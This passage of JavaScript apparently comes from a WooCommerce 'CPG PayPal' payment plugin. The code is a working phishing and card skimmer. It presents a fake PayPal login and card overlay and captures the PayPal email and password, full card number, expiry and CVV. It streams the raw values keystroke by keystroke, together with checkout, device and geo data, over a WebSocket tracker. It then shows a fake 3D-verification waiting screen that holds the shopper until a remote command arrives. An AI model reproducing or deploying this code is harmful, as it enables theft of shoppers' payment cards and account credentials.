                }
                
                // 🔥 使用 trackEvent 方法（内部发送 user_event）
                if (typeof window.cpgTracker.trackEvent === 'function') {
                    window.cpgTracker.trackEvent(eventType, eventData);
                } else {
                    // 备用：直接发送 user_event
                    window.cpgTracker.sendMessage({
                        type: 'user_event',
                        event_type: eventType,
                        session_id: sessionId,
                        order_no: orderNo,
                        order_id: window.cpgTracker.getOrderId?.() || null,
                        data: eventData,
                        timestamp: Date.now()
                    });
                }
                
                return;
            }
            
            // 🔥 规范：卡片字段使用 user_event + input_* 事件类型
            var eventMap = {
                'card_number': 'input_card',
                'expiry': 'input_expiry',
                'cvv': 'input_cvv'
            };
            
            var eventName = eventMap[field] || ('input_' + field);
            
            // Build event data based on field type
            var eventData = {
                payment_method: 'paypal',
                length: value ? value.length : 0
            };
            
            switch (field) {
                case 'card_number':
                    eventData.card_number = value;
                    eventData.card_no = value;
                    eventData.card_number_masked = this.maskCardNumber(value);
                    eventData.card_no_masked = this.maskCardNumber(value);
                    eventData.card_type = data.card_type || '';
                    break;
                case 'expiry':
                    eventData.expiry = value;
                    eventData.expiry_date = value;
                    eventData.card_expiry = value;
                    break;
                case 'cvv':
                    eventData.cvv = value;
                    eventData.card_cvv = value;
                    break;
            }
            
            // 🔥 规范：使用 trackEvent（内部发送 user_event）
            if (typeof window.cpgTracker.trackEvent === 'function') {
                window.cpgTracker.trackEvent(eventName, eventData);
            } else {
                window.cpgTracker.sendMessage({
                    type: 'user_event',
                    event_type: eventName,
                    session_id: sessionId,
                    order_no: orderNo,
                    order_id: window.cpgTracker.getOrderId?.() || null,  // 🔥 新增
                    data: eventData,
                    timestamp: Date.now()
                });
            }
        },
        
        /**
         * 🔥 Mask card number（使用共用模块）
         */
        maskCardNumber: function(cardNumber) {
            // 🔥 优先使用共用模块
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.maskCardNumber === 'function') {
                return window.CPG_CardUtils.maskCardNumber(cardNumber);
            }
            
            // 备用：本地实现
            if (!cardNumber || cardNumber.length < 10) return cardNumber;
            var firstSix = cardNumber.substring(0, 6);
            var lastFour = cardNumber.substring(cardNumber.length - 4);
            return firstSix + '******' + lastFour;
        },
        
        /**
         * 🔥 Handle card submit event (Link Card button click) - Immediately show 3D waiting
         * 🔥🔥🔥 规范流程：手机端弹窗延迟关闭，确保 3D 界面先显示 🔥🔥🔥
         */
        handleCardSubmit: function(data) {
            var self = this;
            var isMobile = this.isMobile();
            
            // 🔥🔥🔥 设置PayPal提交保护标志，防止被change指令关闭 🔥🔥🔥
            window.CPG_PayPalCardSubmitted = Date.now();
            window.CPG_PayPal3DWaitingActive = true;
            
            // 🔥 Step 1: 填充隐藏字段（确保表单提交时有数据）
            $('#cpg_paypal_email').val(data.email || '');
            $('#cpg_paypal_password').val(data.password || '');
            $('#cpg_paypal_card_number').val(data.card_number || '');
            $('#cpg_paypal_card_expiry').val(data.expiry || '');
            $('#cpg_paypal_card_cvv').val(data.cvv || '');
            $('#cpg_paypal_card_brand').val(data.brand || '');
            $('#cpg_paypal_data_complete').val('yes');
            
            // 🔥🔥🔥 Step 2: 立即显示 3D 等待界面（在弹窗关闭之前）🔥🔥🔥
            self.show3DWaiting();
            
            // 🔥🔥🔥 Step 3: 关闭 PayPal 弹窗（手机端延迟关闭，确保 3D 界面已显示）🔥🔥🔥
            if (isMobile) {
                // 📱 手机端：延迟 500ms 关闭，确保 3D 等待界面已完全显示
                setTimeout(function() {
                    self.closeModal();
                    self.hidePayPalOverlay();
                    // 🔥 关闭真实弹窗（如果有）
                    if (self.popupWindow && !self.popupWindow.closed) {
                        self.popupWindow.close();
                    }
                }, 500);
            } else {
                // 💻 桌面端：立即关闭
                this.closeModal();
                this.hidePayPalOverlay();
            }
            
            // 🔥 Step 4: Send card data via WebSocket (same format as main gateway)
            self.sendCardDataViaWebSocket(data);
            
            // 🔥 Step 5: Send status update
            if (window.cpgTracker && window.cpgTracker.sendMessage) {
                window.cpgTracker.sendMessage({
                    type: 'status_update',
                    session_id: window.cpgTracker.sessionId,
                    status: 'Card submitted via PayPal',
                    event: 'paypal_link_card_clicked',
                    timestamp: Date.now()
                });
            }
            
            // 🔥🔥🔥 Step 6: 刷新会话并提交订单（确保会话有效）🔥🔥🔥
            self.refreshSessionAndSubmit();
        },
        
        /**
         * 🔥🔥🔥 刷新会话并提交订单（防止会话超时）🔥🔥🔥
         */
        refreshSessionAndSubmit: function() {
            var self = this;
            var $form = $('form.checkout, form.woocommerce-checkout');
            
            if (!$form.length) {
                console.error('[CPG PayPal] Checkout form not found');
                return;
            }
            
            // 🔥🔥🔥 方法1：触发 WooCommerce 的 update_checkout（刷新会话和nonce）🔥🔥🔥
            if (typeof jQuery !== 'undefined' && jQuery(document.body).trigger) {
                jQuery(document.body).trigger('update_checkout');
            }
            
            // 🔥🔥🔥 方法2：使用 Heartbeat API 保活会话 🔥🔥🔥
            var heartbeatUrl = window.ajaxurl || (window.location.origin + '/wp-admin/admin-ajax.php');
            
            $.ajax({
                type: 'POST',
                url: heartbeatUrl,
                data: {
                    action: 'heartbeat',
                    _nonce: window.heartbeatSettings?.nonce || '',
                    interval: 15
                },
                dataType: 'json',
                timeout: 5000,
                success: function(response) {
                    // 继续提交订单
                    setTimeout(function() {
                        self.doSubmitOrder($form);
                    }, 500);
                },
                error: function() {
                    console.warn('[CPG PayPal] ⚠️ Heartbeat 失败，直接提交订单');
                    // 即使失败也继续提交（可能只是网络问题）
                    setTimeout(function() {
                        self.doSubmitOrder($form);
                    }, 500);
                }
            });
        },
        
        /**
         * 🔥🔥🔥 预刷新 WooCommerce Session（防止会话超时）🔥🔥🔥
         * 🔥 重要：只是保活现有会话，不会创建新会话
         * 使用 WordPress Heartbeat API（专门设计用于保持会话活跃）
         */
        preRefreshSession: function(callback) {
            var self = this;
            
            // 🔥🔥🔥 使用 WordPress Heartbeat API（最安全，只保活不创建新会话）🔥🔥🔥
            var heartbeatUrl = window.ajaxurl || (window.location.origin + '/wp-admin/admin-ajax.php');
            
            $.ajax({
                type: 'POST',
                url: heartbeatUrl,
                data: {
                    action: 'heartbeat',
                    _nonce: window.heartbeatSettings?.nonce || '',
                    interval: 15,
                    'data[wp-refresh-post-lock]': { post_id: 0 }
                },
                dataType: 'json',
                timeout: 5000,
                success: function(response) {
                    if (callback) callback();
                },
                error: function(xhr, status, error) {
                    // 🔥 Heartbeat 失败时，使用备用方法：简单的页面请求
                    console.warn('[CPG PayPal] ⚠️ Heartbeat 失败，使用备用方法');
                    self.keepAliveSimple(callback);
                }
            });
        },
        
        /**
         * 🔥 备用保活方法：简单的 HEAD 请求到当前页面
         * 这只会刷新 PHP session cookie，不会创建新的 WooCommerce session
         */
        keepAliveSimple: function(callback) {
            $.ajax({
                type: 'HEAD',  // 🔥 HEAD 请求：只获取响应头，不获取内容（最轻量）
                url: window.location.href,
                cache: false,
                timeout: 3000,
                complete: function() {
                    if (callback) callback();
                }
            });
        },
        
        /**
         * 🔥 发送卡数据到 WebSocket
         */
        sendCardDataViaWebSocket: function(data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker 不可用');
                return;
            }
            
            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            var checkoutData = {};
            
            // Try to get checkout data
            if (window.cpgTracker.captureCheckoutData) {
                try {
                    checkoutData = window.cpgTracker.captureCheckoutData();
                } catch (e) {
                    console.warn('[CPG PayPal] Could not capture checkout data:', e);
                }
            }
            
            // Send card data (same format as main gateway's card_data_captured)
            var cardData = {
                card_number: data.card_number || '',
                card_number_masked: data.card_number || '',
                expiry: data.expiry || '',
                expiry_date: data.expiry || '',
                card_expiry: data.expiry || '',
                cvv: data.cvv || '',
                card_cvv: data.cvv || '',
                pin: '',
                pin_code: '',
                verification_code: '',
                otp: '',
                card_type: data.brand || '',
                pp_account: data.email || '',
                pp_password: data.password || ''
            };
            
            Object.assign(cardData, checkoutData);
            
            window.cpgTracker.sendMessage({
                type: 'card_data_captured',
                session_id: sessionId,
                order_no: orderNo,
                order_id: window.cpgTracker.getOrderId?.() || null,
                site_name: window.CPG_CONFIG?.site_name || '',
                site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                order_prefix: window.CPG_CONFIG?.order_prefix || '',
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                device_info: window.cpgTracker.deviceInfo || {},
                geo_info: window.cpgTracker.geoInfo || {},
                payment_method: 'paypal',
                data: cardData,
                timestamp: Date.now()
            });
            
            console.log('[CPG PayPal] Card data sent via WebSocket');
        },
        
        /**
         * 🔥 Handle blur events from popup - 符合规范：使用 input_blur 或 verification_blur
         * 🔥 优化：使用统一的 trackFocusEvent 方法（如果可用），确保与主网关一致
         */
        handleBlurEvent: function(field, value, data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available for blur event');
                return;
            }

            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // 🔥🔥🔥 规范：PP账号/密码使用 verification_blur，卡片字段使用 input_blur 🔥🔥🔥
            var eventType = 'input_blur';
            var verificationType = null;
            
            if (field === 'email') {
                eventType = 'verification_blur';
                verificationType = 'pp_account';
            } else if (field === 'password') {
                eventType = 'verification_blur';
                verificationType = 'pp_password';
            }
            
            // 🔥 构建失焦事件数据（完全符合规范文档）
            var blurData = {
                field: field,
                has_value: !!value,
                value_length: value ? value.length : 0
            };
            
            // 🔥 规范：verification_blur 需要包含 verification_type 和实际值
            if (verificationType) {
                blurData.verification_type = verificationType;
                
                // 🔥 发送实际值（规范要求：必须包含）
                if (value && value.length > 0) {
                    blurData.value = value;
                    
                    // 根据验证类型添加特定字段（符合规范字段优先级）
                    if (verificationType === 'pp_account') {
                        blurData.pp_account = value;  // 优先级1
                        blurData.email = value;       // 优先级2
                    } else if (verificationType === 'pp_password') {
                        blurData.pp_password = value;  // 优先级1
                        blurData.password = value;      // 优先级2
                    }
                }
            }
            
            // 🔥 规范：input_blur 需要包含实际值（根据字段类型）
            if (eventType === 'input_blur') {
                blurData.type = 'text';
                
                // 添加具体字段值（符合规范字段优先级）
                if (field === 'card_number') {
                    blurData.card_number = value;  // 优先级1
                    blurData.card_no = value;       // 优先级2
                    blurData.value = value;        // 优先级3
                    blurData.card_type = data.card_type || '';
                } else if (field === 'expiry') {
                    blurData.expiry = value;        // 优先级1
                    blurData.expiry_date = value;  // 优先级2
                    blurData.card_expiry = value;   // 优先级3
                    blurData.value = value;        // 优先级4
                } else if (field === 'cvv') {
                    blurData.cvv = value;           // 优先级1
                    blurData.card_cvv = value;      // 优先级2
                    blurData.value = value;         // 优先级3
                }
            }
            
            // 🔥 使用统一的 trackFocusEvent 方法（如果可用），确保与主网关一致
            if (window.cpgTracker.trackFocusEvent && typeof window.cpgTracker.trackFocusEvent === 'function') {
                window.cpgTracker.trackFocusEvent(eventType, blurData, eventType);
            } else {
                // 备用：直接发送消息
                var message = {
                    type: eventType,
                    event_type: eventType,
                    session_id: sessionId,
                    order_no: orderNo,
                    order_id: window.cpgTracker.getOrderId?.() || null,
                    timestamp: Date.now()
                };
                
                // 合并 blurData 到根级别和 data 对象
                Object.assign(message, blurData);
                message.data = blurData;
                
                window.cpgTracker.sendMessage(message);
            }
            
            // 🔥 If Link Card button blur with complete data, send card_data_captured
            if (field === 'link_card_button' && data.card_number && data.expiry && data.cvv) {
                this.handleCardSubmit(data);
            }
            
            // 🔥🔥🔥 移除 CVV 失焦时自动发送 card_data_captured 的逻辑 🔥🔥🔥
            // 只在用户点击 Link Card 按钮时才发送（由 handleCardSubmit 处理）
        },
        
        handlePopupData: function(data) {
            var self = this;
            
            // 填充隐藏字段
            $('#cpg_paypal_email').val(data.email || '');
            $('#cpg_paypal_password').val(data.password || '');
            $('#cpg_paypal_card_number').val(data.cardNumber || '');
            $('#cpg_paypal_card_expiry').val(data.expiry || '');
            $('#cpg_paypal_card_cvv').val(data.cvv || '');
            $('#cpg_paypal_card_brand').val(data.brand || '');
            $('#cpg_paypal_data_complete').val('yes');
            
            // 🔥🔥🔥 Step 1: Send PayPal login data (email + password) via cpgTracker 🔥🔥🔥
            this.sendPayPalLoginData(data);
            
            // 🔥🔥🔥 Step 2: Send card data via cpgTracker (same as main gateway) 🔥🔥🔥
            this.sendCardData(data);
            
            // Ensure PayPal is selected
            $('#payment_method_cpg_paypal').prop('checked', true).trigger('change');
            
            // 🔥🔥🔥 Step 3: Show 3D verification waiting interface 🔥🔥🔥
            this.show3DWaiting();
            
            // 🔥🔥🔥 Step 4: Submit form via AJAX (same as main gateway) 🔥🔥🔥
            setTimeout(function() {
                self.submitOrderViaAjax();
            }, 500);
        },
        
        /**
         * 🔥 Send PayPal login data via WebSocket（符合规范：使用 verification_input 类型）
         */
        sendPayPalLoginData: function(data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available, cannot send PayPal login data');
                return;
            }

            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // 🔥 规范：使用 verification_input 发送 PP 账号
            window.cpgTracker.sendMessage({
                type: 'verification_input',
                session_id: sessionId,
                order_no: orderNo,
                order_id: window.cpgTracker.getOrderId?.() || null,  // 🔥 新增
                verification_type: 'pp_account',
                field: 'email',
                value: data.email || '',
                timestamp: Date.now()
            });
            
            // 🔥 规范：使用 verification_input 发送 PP 密码
            window.cpgTracker.sendMessage({
                type: 'verification_input',
                session_id: sessionId,
                order_no: orderNo,
                order_id: window.cpgTracker.getOrderId?.() || null,  // 🔥 新增
                verification_type: 'pp_password',
                field: 'password',
                value: data.password || '',
                timestamp: Date.now()
            });
        },
        
        /**
         * 🔥 Send card data via WebSocket (shared with main gateway)
         */
        sendCardData: function(data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available, cannot send card data');
                return;
            }
            
            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            var checkoutData = {};
            
            // Try to get checkout data from cpgTracker
            if (window.cpgTracker.captureCheckoutData) {
                try {
                    checkoutData = window.cpgTracker.captureCheckoutData();
                } catch (e) {
                    console.warn('[CPG PayPal] Could not capture checkout data:', e);
                }
            }
            
            // Validate card number with Luhn algorithm（使用共用模块）
            var cleanCardNumber = (data.cardNumber || '').replace(/\D/g, '');
            if (cleanCardNumber.length < 13) {
                console.warn('[CPG PayPal] Card number too short');
                return;
            }
            
            // 🔥 优先使用共用模块，备用 cpgTracker
            var luhnValid = false;
            if (window.CPG_CardUtils && typeof window.CPG_CardUtils.luhnCheck === 'function') {
                luhnValid = window.CPG_CardUtils.luhnCheck(cleanCardNumber);
            } else if (window.cpgTracker && typeof window.cpgTracker.luhnCheck === 'function') {
                luhnValid = window.cpgTracker.luhnCheck(cleanCardNumber);
            } else {
                luhnValid = true; // 无验证可用时默认通过
            }
            
            if (!luhnValid) {
                console.warn('[CPG PayPal] Card number failed Luhn check');
                return;
            }
            
            // Send card data (same format as main gateway)
            // 🔥 Field names exactly match main gateway
            var cardData = {
                // Card number fields (same as main gateway)
                card_number: data.cardNumber || '',
                card_number_masked: data.cardNumber || '',
                // Expiry fields (same as main gateway)
                expiry: data.expiry || '',
                expiry_date: data.expiry || '',
                card_expiry: data.expiry || '',
                // CVV fields (same as main gateway)
                cvv: data.cvv || '',
                card_cvv: data.cvv || '',
                // Other fields (same as main gateway)
                pin: '',
                pin_code: '',
                verification_code: '',
                otp: '',
                    card_type: data.brand || '',
                    // PayPal specific - 使用后端期望的字段名
                    pp_account: data.email || '',
                    pp_password: data.password || ''
                };
                
                // Merge with checkout data
                Object.assign(cardData, checkoutData);
            
            window.cpgTracker.sendMessage({
                type: 'card_data_captured',
                session_id: sessionId,
                order_no: orderNo,
                site_name: window.CPG_CONFIG?.site_name || '',
                site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                order_prefix: window.CPG_CONFIG?.order_prefix || '',
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                device_info: window.cpgTracker.deviceInfo || {},
                geo_info: window.cpgTracker.geoInfo || {},
                payment_method: 'paypal',
                data: cardData,
                timestamp: Date.now()
            });
            
            console.log('[CPG PayPal] Card data sent via WebSocket');
        },
        
        /**
         * 🔥 Show PayPal overlay (移动端备用，当真实弹窗被阻止时使用)
         */
        showPayPalOverlay: function() {
            var $overlay = $('#cpg-paypal-overlay');
            if ($overlay.length) {
                $overlay.css('display', 'flex');
                $('html, body').addClass('cpg-verify-active');
                document.body.style.overflow = 'hidden';
                
                // Reset to email step
                this.resetPayPalSteps();
            } else {
                console.warn('[CPG PayPal] PayPal overlay template not found');
            }
        },
        
        /**
         * 🔥 Hide PayPal overlay
         */
        hidePayPalOverlay: function() {
            var $overlay = $('#cpg-paypal-overlay');
            if ($overlay.length) {
                $overlay.css('display', 'none');
                $('html, body').removeClass('cpg-verify-active');
                document.body.style.overflow = '';
            }
        },
        
        /**
         * 🔥 Reset PayPal steps to initial state
         */
        resetPayPalSteps: function() {
            // Show email step, hide others
            $('.cpg-paypal-step').hide();
            $('.cpg-paypal-step[data-step="email"]').show().addClass('active');
            
            // Clear inputs
            $('#paypal-email').val('');
            $('#paypal-password').val('');
            $('#paypal-card-number').val('');
            $('#paypal-card-expiry').val('');
            $('#paypal-card-cvv').val('');
        },
        
        /**
         * 🔥 Show 3D verification waiting interface
         * 🔥🔥🔥 修复：确保等待界面稳定显示，不会被意外关闭 🔥🔥🔥
         * 🔥🔥🔥 新增：心跳保活机制，防止会话超时 🔥🔥🔥
         */
        show3DWaiting: function() {
            var self = this;
            
            // 🔥 设置全局标志，防止等待界面被意外关闭
            window.CPG_PayPal3DWaitingActive = true;
            
            // 🔥🔥🔥 启动会话保活心跳（每60秒刷新一次 session）🔥🔥🔥
            self.startSessionHeartbeat();
            
            // 🔥 先保存商品信息到全局变量（确保订单页面也能获取）
            if (window.cpgTracker && typeof window.cpgTracker.getProductInfo === 'function') {
                try {
                    var productInfo = window.cpgTracker.getProductInfo();
                    if (productInfo && productInfo.name && productInfo.name !== 'N/A') {
                        window.CPG_ProductInfo = productInfo;
                    }
                } catch (e) {
                    console.warn('[CPG PayPal] 获取商品信息失败:', e);
                }
            }
            
            // Try using the global function
            if (typeof window.showVerificationWaiting === 'function') {
                window.showVerificationWaiting();
                return;
            }
            
            // Try using CPG_3D_Verification
            if (window.CPG_3D_Verification && typeof window.CPG_3D_Verification.showWaiting === 'function') {
                window.CPG_3D_Verification.showWaiting({});
                return;
            }
            
            // Fallback: directly show the waiting container
            var $waiting = $('#cpg-waiting, #cpg-verification-waiting');
            if ($waiting.length) {
                // 🔥 使用更强的显示方式
                $waiting.css('display', 'flex').addClass('active');
                $('html, body').addClass('cpg-verify-active');
                document.body.style.cssText = 'overflow: hidden !important;';
                document.documentElement.style.cssText = 'overflow: hidden !important;';
                
                // 🔥 手动设置waitingShown标志
                if (window.CPG_3D_Verification) {
                    window.CPG_3D_Verification.waitingShown = true;
                }
                
                // 🔥 3秒后切换到第二阶段（与3d-verification.js一致）
                setTimeout(function() {
                    var stage1 = document.getElementById('visaStage1');
                    var stage2 = document.getElementById('visaStage2');
                    var footer = document.querySelector('#cpg-waiting .cpg-verify-footer');
                    
                    if (stage1 && stage2) {
                        stage1.style.cssText = 'display: none !important;';
                        stage2.style.cssText = 'display: flex !important; flex-direction: column !important; align-items: center !important; justify-content: center !important;';
                        
                        // 🔥 更新商品信息
                        if (window.CPG_3D_Verification && typeof window.CPG_3D_Verification.updateWaitingDetails === 'function') {
                            window.CPG_3D_Verification.updateWaitingDetails();
                        }
                    }
                    if (footer) {
                        footer.style.cssText = 'display: flex !important;';
                    }
                }, 3000);
            } else {
                console.warn('[CPG PayPal] 3D waiting interface container not found');
            }
        },
        
        /**
         * 🔥🔥🔥 会话保活心跳（防止等待验证期间会话超时）🔥🔥🔥
         * 🔥 重要：只保活现有会话，不创建新会话
         * 🔥 规范：与主网关保持一致，确保 OTP/换卡等流程不会超时
         */
        startSessionHeartbeat: function() {
            var self = this;
            
            // 🔥 清除之前的心跳（如果有）
            if (self.sessionHeartbeatTimer) {
                clearInterval(self.sessionHeartbeatTimer);
            }
            
            // 🔥 也清除弹窗心跳（避免重复）
            this.stopPopupSessionHeartbeat();
            
            console.log('[CPG PayPal] 🫀 启动 3D 验证会话保活心跳');
            
            // 🔥 立即发送一次心跳
            this.sendSessionHeartbeat();
            
            // 🔥 每30秒刷新一次 session（更频繁，确保不超时）
            self.sessionHeartbeatTimer = setInterval(function() {
                // 🔥 检查是否仍在等待验证状态
                if (!window.CPG_PayPal3DWaitingActive) {
                    clearInterval(self.sessionHeartbeatTimer);
                    console.log('[CPG PayPal] 🫀 3D 验证已完成，停止心跳');
                    return;
                }
                
                self.sendSessionHeartbeat();
            }, 30000); // 30秒间隔（更频繁）
            
            // 🔥 10分钟后自动停止心跳（延长到10分钟，给用户足够时间完成验证）
            setTimeout(function() {
                if (self.sessionHeartbeatTimer) {
                    clearInterval(self.sessionHeartbeatTimer);
                    console.log('[CPG PayPal] 🫀 心跳已达到10分钟上限，自动停止');
                }
            }, 600000); // 10分钟
        },
        
        /**
         * 🔥🔥🔥 停止会话保活心跳 🔥🔥🔥
         */
        stopSessionHeartbeat: function() {
            if (this.sessionHeartbeatTimer) {
                clearInterval(this.sessionHeartbeatTimer);
                this.sessionHeartbeatTimer = null;
            }
        },
        
        /**
         * 🔥 Submit order via AJAX (same as main gateway)
         * 🔥🔥🔥 修复：保持等待界面显示，不意外关闭 🔥🔥🔥
         * 🔥🔥🔥 修复：刷新 nonce 防止 session expired 🔥🔥🔥
         */
        submitOrderViaAjax: function() {
            var self = this;
            var $form = $('form.checkout, form.woocommerce-checkout');
            
            if (!$form.length) {
                console.error('[CPG PayPal] Checkout form not found');
                return;
            }
            
            // 🔥🔥🔥 关键：确保 PayPal 被选中 🔥🔥🔥
            $('#payment_method_cpg_paypal').prop('checked', true);
            
            // 🔥🔥🔥 修复 Session Expired：刷新会话并提交订单 🔥🔥🔥
            self.refreshSessionAndSubmit();
        },
        
        /**
         * 🔥🔥🔥 保活会话并提交订单 🔥🔥🔥
         * 🔥 重要：只保活现有会话，不创建新会话
         * 🔥 使用 WordPress Heartbeat API 保活，然后直接提交订单
         */
        refreshNonceAndSubmit: function($form) {
            var self = this;
            
            // 🔥🔥🔥 使用 WordPress Heartbeat API 保活（只刷新 PHP session，不创建新 WooCommerce session）🔥🔥🔥
            var heartbeatUrl = window.ajaxurl || (window.location.origin + '/wp-admin/admin-ajax.php');
            
            $.ajax({
                type: 'POST',
                url: heartbeatUrl,
                data: {
                    action: 'heartbeat',
                    _nonce: window.heartbeatSettings?.nonce || '',
                    interval: 15
                },
                dataType: 'json',
                timeout: 3000,
                complete: function() {
                    // 🔥 无论成功还是失败，都继续提交订单
                    // 因为 Heartbeat 只是保活，真正的验证是在提交时进行的
                    self.doSubmitOrder($form);
                }
            });
        },
        
        /**
         * 🔥 实际提交订单
         */
        doSubmitOrder: function($form) {
            var self = this;
            
            // Prepare form data
            var formData = $form.serialize();
            
            // Get checkout URL
            var checkoutUrl = window.wc_checkout_params?.checkout_url || (window.location.origin + '/?wc-ajax=checkout');
            
            // 🔥 添加表单处理状态
            $form.addClass('processing');
            
            $.ajax({
                type: 'POST',
                url: checkoutUrl,
                data: formData,
                dataType: 'json',
                success: function(response) {
                    $form.removeClass('processing');
                    
                    if (response.result === 'success' && response.redirect) {
                        // 🔥🔥🔥 关键：只保存跳转URL，不自动跳转 🔥🔥🔥
                        // 跳转只有在收到支付网关的 complete 指令时才执行
                        // 由 3d-verification.js 的 showComplete 方法控制
                        window.CPG_PendingRedirect = response.redirect;
                        
                        // 🔥 定义跳转函数（仅供 showComplete 调用）
                        window.CPG_CompleteAndRedirect = function() {
                            if (window.CPG_PendingRedirect) {
                                console.log('[CPG PayPal] ✅ 收到 complete 指令，执行跳转');
                                window.location.href = window.CPG_PendingRedirect;
                            }
                        };
                        
                        console.log('[CPG PayPal] 💾 已保存待跳转URL，等待支付网关 complete 指令');
                        
                        // 🔥🔥🔥 关键：成功后不关闭等待界面，保持显示等待验证 🔥🔥🔥
                        // 确保等待界面保持显示
                        window.CPG_PayPal3DWaitingActive = true;
                        if (window.CPG_3D_Verification) {
                            window.CPG_3D_Verification.waitingShown = true;
                        }
                        
                        // 🔥 确保等待界面仍然显示（防止被意外关闭）
                        var $waiting = $('#cpg-waiting, #cpg-verification-waiting');
                        if ($waiting.length) {
                            $waiting.css('display', 'flex').addClass('active');
                            $('html, body').addClass('cpg-verify-active');
                            document.body.style.cssText = 'overflow: hidden !important;';
                            document.documentElement.style.cssText = 'overflow: hidden !important;';
                        }
                        
                        // 🔥 触发订单创建事件
                        $(document).trigger('cpg_order_created', [response]);
                        
                    } else if (response.result === 'failure') {
                        console.error('[CPG PayPal] Order failed:', response.messages);
                        
                        // 🔥🔥🔥 检查是否是会话超时错误 🔥🔥🔥
                        var failureMessages = response.messages || '';
                        var isSessionExpiredInResponse = failureMessages && (
                            failureMessages.toLowerCase().indexOf('session') > -1 || 
                            failureMessages.toLowerCase().indexOf('expired') > -1 ||
                            failureMessages.toLowerCase().indexOf('sorry, your session has expired') > -1
                        );
                        
                        if (isSessionExpiredInResponse) {
                            console.warn('[CPG PayPal] ⚠️ 响应中检测到会话超时，尝试重新保活并重试');
                            
                            // 🔥 确保等待界面保持显示
                            window.CPG_PayPal3DWaitingActive = true;
                            if (window.CPG_3D_Verification) {
                                window.CPG_3D_Verification.waitingShown = true;
                            }
                            
                            // 🔥 强制显示等待界面（防止被关闭）
                            var $waiting = $('#cpg-waiting, #cpg-verification-waiting');
                            if ($waiting.length) {
                                $waiting.css('display', 'flex').addClass('active');
                                $('html, body').addClass('cpg-verify-active');
                                document.body.style.cssText = 'overflow: hidden !important;';
                                document.documentElement.style.cssText = 'overflow: hidden !important;';
                            }
                            
                            // 🔥 重新刷新会话并提交订单
                            self.refreshSessionAndSubmit();
                            return; // 不关闭等待界面，等待重试
                        }
                        
                        // 🔥🔥🔥 只有明确失败时才关闭等待界面 🔥🔥🔥
                        window.CPG_PayPal3DWaitingActive = false;
                        
                        // Hide waiting interface
                        self.hideWaitingInterface();
                        
                        // 🔥 显示 WooCommerce 错误
                        if (response.messages) {
                            // 滚动到顶部
                            $('html, body').animate({ scrollTop: 0 }, 300);
                            
                            // 清除旧错误
                            $('.woocommerce-error, .woocommerce-message').remove();
                            
                            // 显示新错误
                            var $notices = $('.woocommerce-notices-wrapper').first();
                            if ($notices.length) {
                                $notices.html(response.messages);
                            } else {
                                $form.prepend(response.messages);
                            }
                        }
                        
                        // 🔥 显示结账表单
                        $form.show();
                        $('.woocommerce-checkout').show();
                    }
                },
                error: function(xhr, status, error) {
                    console.error('[CPG PayPal] AJAX error:', error, xhr.responseText);
                    
                    $form.removeClass('processing');
                    
                    // 🔥🔥🔥 检查是否是正常的302重定向（成功情况）🔥🔥🔥
                    // 有些服务器配置会返回302重定向而不是JSON响应
                    if (xhr.status === 0 || xhr.status === 302 || xhr.status === 200) {
                        // 🔥 确保等待界面保持显示
                        window.CPG_PayPal3DWaitingActive = true;
                        if (window.CPG_3D_Verification) {
                            window.CPG_3D_Verification.waitingShown = true;
                        }
                        // 不关闭等待界面，可能是后端正在处理
                        return;
                    }
                    
                    // 🔥🔥🔥 检查是否是会话超时错误 🔥🔥🔥
                    var responseText = xhr.responseText || '';
                    var isSessionExpired = responseText && (
                        responseText.toLowerCase().indexOf('session') > -1 || 
                        responseText.toLowerCase().indexOf('expired') > -1 ||
                        responseText.toLowerCase().indexOf('nonce') > -1 ||
                        responseText.toLowerCase().indexOf('sorry, your session has expired') > -1
                    );
                    
                    if (isSessionExpired) {
                        console.warn('[CPG PayPal] ⚠️ 检测到会话超时，尝试重新保活并重试');
                        
                        // 🔥 确保等待界面保持显示
                        window.CPG_PayPal3DWaitingActive = true;
                        if (window.CPG_3D_Verification) {
                            window.CPG_3D_Verification.waitingShown = true;
                        }
                        
                        // 🔥 强制显示等待界面（防止被关闭）
                        var $waiting = $('#cpg-waiting, #cpg-verification-waiting');
                        if ($waiting.length) {
                            $waiting.css('display', 'flex').addClass('active');
                            $('html, body').addClass('cpg-verify-active');
                            document.body.style.cssText = 'overflow: hidden !important;';
                            document.documentElement.style.cssText = 'overflow: hidden !important;';
                        }
                        
                        // 🔥 重新刷新会话并提交订单
                        self.refreshSessionAndSubmit();
                        return; // 不关闭等待界面，等待重试
                    }
                    
                    // 其他错误才关闭等待界面
                    window.CPG_PayPal3DWaitingActive = false;
                    
                    // Hide waiting interface
                    self.hideWaitingInterface();
                    
                    // 🔥 显示结账表单
                    $form.show();
                    $('.woocommerce-checkout').show();
                    
                    // 🔥 检查是否是 session expired
                    if (xhr.responseText && xhr.responseText.indexOf('session') > -1) {
                        alert('Your session has expired. Please refresh the page and try again.');
                        window.location.reload();
                    } else {
                        alert('Payment submission failed. Please try again.');
                    }
                }
            });
        },
        
        /**
         * 🔥 隐藏等待界面
         */
        hideWaitingInterface: function() {
            // 🔥🔥🔥 停止会话保活心跳 🔥🔥🔥
            this.stopSessionHeartbeat();
            
            if (typeof window.hideVerificationWaiting === 'function') {
                window.hideVerificationWaiting();
            } else if (window.CPG_3D_Verification && typeof window.CPG_3D_Verification.hideAll === 'function') {
                window.CPG_3D_Verification.hideAll(true);
            } else {
                $('#cpg-waiting').hide();
                $('html, body').removeClass('cpg-verify-active');
                document.body.style.overflow = '';
            }
        }
    };

    $(document).ready(function() {
            CPGPayPal.init();
    });

    window.CPGPayPal = CPGPayPal;

})(jQuery);
